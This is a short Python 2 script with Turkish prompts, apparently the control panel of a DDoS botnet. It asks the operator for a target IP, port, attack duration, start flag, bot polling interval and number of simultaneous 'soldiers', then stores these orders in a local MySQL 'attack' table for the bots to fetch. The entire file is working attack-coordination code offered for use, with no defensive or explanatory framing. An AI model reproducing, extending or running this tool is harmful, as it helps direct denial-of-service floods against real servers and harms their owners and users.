#!/usr/bin/env python
# -*- coding: utf-8 -*
import mysql.connector
ip = raw_input("Saldiri yapilacak Ipi giriniz (Ornek:192.168.1.2):")
sn = raw_input("Saldiri yapilacak sureyi saniye olarak giriniz :")
port=raw_input("Saldiri yapilacak Portu Giriniz:")
kontrol=raw_input("Saldiri simdi mi gerceklestirilsin(evet=1 hayir=0):")
uyku=raw_input("Askerler kac saniyede bir emrinizi kontrol etsin? : ")
saldirigucu=raw_input("Es zamanli kac asker saldirsin?=")

cnx = mysql.connector.connect(user='root', password='',
                              host='localhost',
                              database='vt',use_pure=False)

cursor = cnx.cursor()
cursor.execute ("""UPDATE saldiri SET saldiri_ip=%s,saldiri_sure=%s,saldiri_port=%s,saldiri_kontrol=%s,uykukontrol=%s,askergucu=%s WHERE id=%s""",(ip,sn,port,kontrol,uyku,saldirigucu,2))
cnx.commit()
cnx.close()

